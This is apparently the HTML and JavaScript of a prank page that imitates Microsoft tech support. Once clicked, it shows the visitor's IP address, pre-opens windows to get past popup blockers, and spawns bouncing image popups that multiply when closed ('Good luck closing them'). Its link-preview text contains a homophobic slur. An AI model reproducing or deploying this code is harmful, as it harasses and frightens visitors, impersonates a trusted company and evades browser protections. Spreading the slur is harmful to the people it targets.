<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Q U I E T</title>
  <meta property="og:title" content="Stop lookin" />
  <meta property="og:description" content="what are u a faggot? CLICK IT!." />
  <meta property="og:image" content="https://cdn.discordapp.com/attachments/1448206166189674518/1467361747697402031/IMG_3375_-_Copy.jpg?ex=69801a9e&is=697ec91e&hm=93b4a68db03ae35820839b99ea88c6e226b5db4a5ae2f80c81c7703a5f67c6bd&" />
  <meta property="og:type" content="website" />
  <meta property="og:url" content="https://andrilchakraborty.github.io/fm/" />
  <style>
    * { box-sizing: border-box; margin:0; padding:0; }
    body {
      font-family: Arial, sans-serif;
      height:100vh;
      color: #fff;
      display:flex;
      justify-content:center;
      align-items:center;
      flex-direction:column;
      text-align:center;
      overflow:hidden;
      background:#000;
      transition: background-color 1s ease-in-out;
    }
    /* Initial overlay that you click */
    .initial-screen {
      position: absolute;
      inset: 0;
      display:flex;
      justify-content:center;
      align-items:center;
      background: #000;
      z-index: 20;
      transition: opacity 1s ease-in-out;
    }
    .initial-text {
      font-size: 2.4rem;
      color: white;
      font-weight: 800;
      cursor: pointer;
      padding: 2rem 3rem;
      border-radius: 12px;
      background: rgba(255,255,255,0.04);
      border: 2px solid rgba(255,255,255,0.08);
      text-transform: uppercase;
      user-select:none;
    }
    /* Background video */
    video.background-video {
      position: absolute;
      inset: 0;
      width:100%;
      height:100%;
      object-fit:cover;
      z-index: -1;
    }
    /* main content hidden initially */
    #main-content {
      display: none;
      z-index: 2;
      animation: slideUp 600ms ease-out forwards;
    }
    @keyframes slideUp {
      from { transform: translateY(20px); opacity: 0; }
      to { transform: translateY(0); opacity: 1; }
    }
    .socials-container {
      display:inline-block;
      background: rgba(0,0,0,0.7);
      border-radius: 12px;
      padding: 28px;
      margin-top: 1rem;
      min-width: 320px;
    }
    .typewriter-text {
      display:inline-block;
      font-size: 2.4rem;
      font-weight: 800;
      text-transform: uppercase;
      white-space: nowrap;
      overflow: hidden;
      color: #f33;
      margin-bottom: 0.6rem;
      text-shadow: 0 0 6px #fff;
      position:relative;
    }
    .cursor { display:inline-block; width:6px; height:36px; background:#fff; margin-left:8px; vertical-align:middle;
      animation: blink 0.8s step-end infinite; }
    @keyframes blink { 50% { opacity:0 } }
    .description-text { font-size: 1rem; color: #eee; margin-top: 0.8rem; text-shadow: 0 0 8px #fff; }
    .social-icons { display:flex; justify-content:center; gap:18px; margin-top: 1rem; }
    .social-icons a img { width:46px; height:46px; display:block; filter: invert(1) drop-shadow(0 0 6px #fff); }
    audio { margin-top: 14px; border-radius: 10px; background: rgba(0,0,0,0.35); padding:8px; }
    /* status from popup script */
    #status { font-size: 0.9rem; color:#aaa; margin-top:8px; max-width:420px; }
  </style>
</head>
<body>
  <!-- Initial overlay -->
  <div class="initial-screen" id="initial-screen" aria-hidden="false">
    <div class="initial-text" id="enter-btn" role="button">Click For Tech Support</div>
  </div>
  <!-- Background video (keeps playing behind everything) -->
  <video class="background-video" autoplay loop muted playsinline>
    <source src="https://cdn.discordapp.com/attachments/1448206166189674518/1467362306416705607/IMG_3375_-_Copy_online-video-cutter.com.mp4?ex=69801b24&is=697ec9a4&hm=4ef8f1419f844e8c52d5bd41d61295a6f3a8baff003c4f72669694b1fc6ac5c6&" type="video/mp4">
    Your browser does not support the video tag.
  </video>
  <!-- Main content shown after enter -->
  <div id="main-content" aria-hidden="true">
    <div class="socials-container">
      <div class="typewriter-text" id="typewriter">
        <span id="ip-text"></span><span class="cursor" id="cursor"></span>
      </div>
      <div class="description-text">Welcome to Microsoft support — how may I help you?</div>
      <div class="social-icons" aria-hidden="false">
        <a href="https://support.microsoft.com/en-us" target="_blank" rel="noreferrer noopener" title="Microsoft">
          <img src="https://img.icons8.com/color/48/microsoft.png" alt="Microsoft"/>
        </a>
        <a href="https://amazon.com" target="_blank" rel="noreferrer noopener" title="Amazon">
          <img src="https://img.icons8.com/color/48/amazon.png" alt="Amazon"/>
        </a>
        <a href="https://paypal.com" target="_blank" rel="noreferrer noopener" title="PayPal">
          <img src="https://img.icons8.com/color/48/paypal.png" alt="PayPal"/>
        </a>
        <a href="https://ebay.com" target="_blank" rel="noreferrer noopener" title="eBay">
          <img src="https://img.icons8.com/color/48/ebay.png" alt="eBay"/>
        </a>
        <a href="https://cash.app" target="_blank" rel="noreferrer noopener" title="CashApp">
          <img src="https://img.icons8.com/?size=48&id=mlOg8xC4khEI&format=png&color=000000" alt="CashApp"/>
        </a>
      </div>
      <audio id="background-audio" loop>
        <source src="https://cdn.discordapp.com/attachments/1448206166189674518/1467361314002305024/Theme_From_New_York_New_York_2008_Remastered_-_Frank_Sinatra.mp3?ex=69801a37&is=697ec8b7&hm=23bce7b15ab402511fc988a0866fe95f80f4af83be4fe4c8d59b2454f5cd87c7&" type="audio/mp3">
        Your browser does not support audio.
      </audio>
      <div id="status">Ready.</div>
    </div>
  </div>
  <!-- All JS in one place -->
  <script>
    /***********************************************************
     * UI helpers: IP fetch, typewriter text, audio play, enter
     ***********************************************************/
    const enterBtn = document.getElementById('enter-btn');
    const initialScreen = document.getElementById('initial-screen');
    const mainContent = document.getElementById('main-content');
    const ipTextEl = document.getElementById('ip-text');
    const statusEl = document.getElementById('status');
    const audioEl = document.getElementById('background-audio');
    function typeOutText(text, element, speed=120) {
      element.textContent = '';
      let i = 0;
      const iv = setInterval(() => {
        if (i < text.length) {
          element.textContent += text[i++];
        } else {
          clearInterval(iv);
        }
      }, speed);
    }
    async function fetchAndDisplayIP() {
      try {
        const resp = await fetch('https://api.ipify.org?format=json');
        const data = await resp.json();
        typeOutText(data.ip || 'unknown', ipTextEl, 140);
      } catch (err) {
        console.error('IP fetch failed', err);
        typeOutText('???', ipTextEl, 120);
      }
    }
    // Ensure audio play attempt happens on user gesture
    function tryPlayAudio() {
      audioEl.play().catch(()=>{ /* ignored */ });
    }
    // Title typing animation (small fun loop)
    (function startTitleTyping(){
      const base = '@';
      const text = ' Q u i e t';
      let idx = 0, dir = 1;
      setInterval(() => {
        document.title = base + text.slice(0, idx);
        idx += dir;
        if (idx >= text.length || idx <= 0) dir *= -1;
      }, 160);
    })();

    /***********************************************************
     * Pre-open pool to reduce popup-blocker UI
     * --- ADDED: preopenPool + preOpenWindows() ---
     ***********************************************************/
    const preopenPool = [];
    function preOpenWindows(n = 6) {
      for (let i = 0; i < n; i++) {
        try {
          // Use about:blank so it's same-origin and writable
          const w = window.open('about:blank', '_blank');
          if (w) {
            // mark it as "reserved" (we'll write to it later)
            preopenPool.push(w);
          }
        } catch (e) {
          // ignore; if blocked, pool remains small
        }
      }
    }

    /***********************************************************
     * Bouncing/popups logic (merged from second script)
     ***********************************************************/
    const POPUP_WIDTH = 460;
    const POPUP_HEIGHT = 580;
    const VELOCITY = 7;
    const TICK_MS = 28;
    const MARGIN = 50;
    const TOP_MARGIN = 80;
    // sample image pool (you can edit/expand)
    const imagePool = [
      "https://i.redd.it/d1vg3bkqbsgg1.jpeg",
      "https://i.redd.it/6j3kd2babsgg1.jpeg",
      "https://i.redd.it/t58t10rz9sgg1.jpeg",
      "https://i.redd.it/6sgrpkzi9sgg1.jpeg",
      "https://i.redd.it/jnduuc6n8sgg1.gif",
      "https://i.redd.it/sv4fhcqt7sgg1.jpeg",
      "https://i.redd.it/psa8tahm6sgg1.gif",
      "https://i.redd.it/x744wri56sgg1.jpeg",
      "https://i.redd.it/vortobde4sgg1.jpeg",
      "https://i.redd.it/6ln2n8tv3sgg1.jpeg",
      "https://i.redd.it/fo7rhta0urgg1.jpeg",
      "https://i.redd.it/pcvn7aittrgg1.jpeg",
      "https://i.redd.it/r1p7qc0msrgg1.png",
      "https://i.redd.it/90ywzxmcqrgg1.jpeg",
      "https://i.redd.it/uhehj9hkprgg1.jpeg",
      "https://i.redd.it/nvyo12mpnrgg1.jpeg",
      // placeholders allowed — add real ones if needed
    ];
    const activePopups = new Set();
    function openPopupBlank(title = "IDIOT.exe") {
      const left = Math.max(10, (screen.availWidth - POPUP_WIDTH) / 2 + ((Math.random()*260 - 130)|0));
      const top = Math.max(10, (screen.availHeight - POPUP_HEIGHT) / 2 + ((Math.random()*180 - 90)|0));
      const features = `width=${POPUP_WIDTH},height=${POPUP_HEIGHT},left=${left},top=${top},resizable=yes,scrollbars=no,status=no,toolbar=no,menubar=no,location=no`;
      const win = window.open('', '_blank', features);
      if (!win) {
        // user likely blocked fresh popups
        return null;
      }
      return win;
    }

    function spawnBouncingWindow() {
      if (!imagePool.length) {
        console.warn('No images in pool');
        return;
      }
      const imgUrl = imagePool[Math.floor(Math.random() * imagePool.length)];
      const html = `<!doctype html>
      <html><head><meta charset="utf-8"><title>Bouncing Image</title>
      <style>html,body{margin:0;height:100%;background:#000;}img{width:100%;height:100%;object-fit:contain;}</style>
      </head><body>
        <img src="${imgUrl}" alt="image" />
        <script>
          // inform opener when this child unloads
          try {
            addEventListener('beforeunload', function() {
              try { opener && opener.postMessage({type:'child_closing'}, '*'); } catch(e){}
            });
          } catch(e){}
        <\/script>
      </body></html>`;

      // Try to reuse a window from the pre-open pool first (avoids blocker)
      let win = null;
      while (preopenPool.length) {
        const candidate = preopenPool.pop();
        try {
          // if the candidate was closed, skip it
          if (!candidate || candidate.closed) continue;
          win = candidate;
          break;
        } catch (e) {
          // accessing .closed might fail in rare cases, skip candidate
          continue;
        }
      }

      // If no pre-opened window, fall back to opening a fresh one (may be blocked)
      if (!win) {
        win = openPopupBlank('Bouncing');
        if (!win) {
          // fresh open was blocked; nothing else to do
          return;
        }
      }

      try {
        // same-origin or about:blank => safe to write
        win.document.open();
        win.document.write(html);
        win.document.close();
      } catch (e) {
        console.error('Failed to write to popup', e);
        // if write fails, try a fresh open
        try {
          const fallback = openPopupBlank('Bouncing');
          if (fallback) {
            fallback.document.open();
            fallback.document.write(html);
            fallback.document.close();
            activePopups.add(fallback);
            // attach monitor & bounce below
            setupPopupAfterOpen(fallback);
          }
        } catch (inner) {}
        return;
      }

      activePopups.add(win);
      // attach monitor & start bouncing behavior
      setupPopupAfterOpen(win);
    }

    // Factor out setup used after popup is created/written
    function setupPopupAfterOpen(win) {
      // --- per-window monitor: spawn replacement immediately when closed ---
      try {
        win.__spawn_handled = false;
      } catch (e) {}
      const monitorInterval = setInterval(() => {
        try {
          if (!win || win.closed) {
            clearInterval(monitorInterval);
            try { win.__spawn_handled = true; } catch(e){}
            activePopups.delete(win);
            // immediate single replacement
            spawnBouncingWindow();
          }
        } catch (e) {
          clearInterval(monitorInterval);
          activePopups.delete(win);
        }
      }, 350);

      // start bouncing motion
      startBouncing(win);
    }

    function startBouncing(win) {
      if (!win || win.closed) return;
      let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1);
      let vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1);
      function tick() {
        try {
          if (!win || win.closed) { activePopups.delete(win); return; }
          let x = win.screenX;
          let y = win.screenY;
          let w = win.outerWidth || POPUP_WIDTH;
          let h = win.outerHeight || POPUP_HEIGHT;
          if (x <= MARGIN) vx = Math.abs(vx);
          if (x + w >= screen.availWidth - MARGIN) vx = -Math.abs(vx);
          if (y <= TOP_MARGIN) vy = Math.abs(vy);
          if (y + h >= screen.availHeight - MARGIN) vy = -Math.abs(vy);
          try { win.moveBy(vx, vy); } catch(e){}
          requestAnimationFrame(tick);
        } catch (e) { /* ignore cross-origin move issues */ }
      }
      tick();
    }

    // If a popup closes, spawn extras (keeps your original idea)
    function watchForClosures() {
      setInterval(() => {
        let closedCount = 0;
        for (const win of [...activePopups]) {
          try {
            if (win.closed) {
              activePopups.delete(win);
              closedCount++;
            }
          } catch(e){
            activePopups.delete(win);
          }
        }
        if (closedCount > 0) {
          const howMany = Math.max(1, closedCount + Math.floor(Math.random()*2));
          for (let i = 0; i < howMany; i++) {
            setTimeout(spawnBouncingWindow, i * 220);
          }
        }
      }, 900);
    }

    // Listen for child message (child posts beforeunload)
    window.addEventListener('message', (e) => {
      if (e.data?.type === 'child_closing') {
        // deterministic replacements to keep the pressure
        spawnBouncingWindow();
        setTimeout(spawnBouncingWindow, 200);
      }
    });

    window.spawnExtra = () => {
      if (Math.random() < 0.6) spawnBouncingWindow();
    };

    // Start everything: multiple initial spawns + watchers
    function startBallsChaos() {
      statusEl.textContent = `Spawning chaos — popups may be blocked by your browser. Images: ${imagePool.length}`;
      // open several first
      for (let i = 0; i < 5; i++) spawnBouncingWindow();
      setTimeout(() => {
        for (let i = 0; i < 4; i++) spawnBouncingWindow();
      }, 700);
      watchForClosures();
      // also allow random clicks in page to create more
      document.addEventListener('click', () => {
        if (Math.random() < 0.22) spawnBouncingWindow();
      }, true);
    }

    /***********************************************************
     * The enterSite function: hides intro, shows main UI,
     * triggers audio, ip fetch, and the bouncing/popups.
     ***********************************************************/
    async function enterSite() {
      tryPlayAudio();
      initialScreen.style.opacity = '0';
      initialScreen.setAttribute('aria-hidden', 'true');
      setTimeout(() => {
        initialScreen.style.display = 'none';
      }, 900);
      mainContent.style.display = 'block';
      mainContent.setAttribute('aria-hidden', 'false');
      // small UI flourish
      statusEl.textContent = 'Loading...';
      // fetch IP and type it out
      await fetchAndDisplayIP();
      // start chaos (popups)
      startBallsChaos();
      // update status
      setTimeout(() => {
        statusEl.textContent = 'Good luck closing them…';
      }, 1300);
    }

    // wire enter button (initial click) to pre-open windows and do everything
    enterBtn.addEventListener('click', (e) => {
      // prevent double-activation
      enterBtn.style.pointerEvents = 'none';
      // Pre-open blank windows during the actual user click gesture.
      // Pick a modest number (6) to reduce chance of being blocked or flagged.
      preOpenWindows(6);
      // now run the regular enter-site flow (which will reuse pre-opened windows)
      enterSite();
    });

    // Also try a body-level click to resume audio in some browsers
    document.body.addEventListener('click', () => {
      tryPlayAudio();
    }, { once:true });
  </script>
</body>
</html>
